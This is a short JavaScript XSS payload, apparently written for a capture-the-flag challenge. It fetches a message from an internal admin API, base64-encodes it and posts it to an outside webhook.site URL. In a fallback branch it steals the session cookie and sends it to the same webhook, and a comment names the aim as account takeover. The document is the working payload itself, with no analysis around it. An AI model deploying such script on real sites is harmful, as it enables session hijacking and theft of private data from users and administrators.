    <script>
       (async () => {
    const webhook = "https://webhook.site/eea9d67e-7379-46ca-b85a-c69dad2bf391";
    const msgId = "69ea9107bee6d6b7c664642e";
    
    try {
        // Fetch the flag from the internal admin API
        const response = await fetch(`/api/admin/messages/${msgId}`);
        const data = await response.text();
        
        // Exfiltrate the flag to your webhook
        await fetch(webhook, {
            method: 'POST',
            mode: 'no-cors',
            body: btoa("FLAG_FOUND: " + data)
        });
    } catch (e) {
        // Backup: Steal the session cookie for ATO
        fetch(webhook + "/cookie?val=" + btoa(document.cookie));
    }
})();
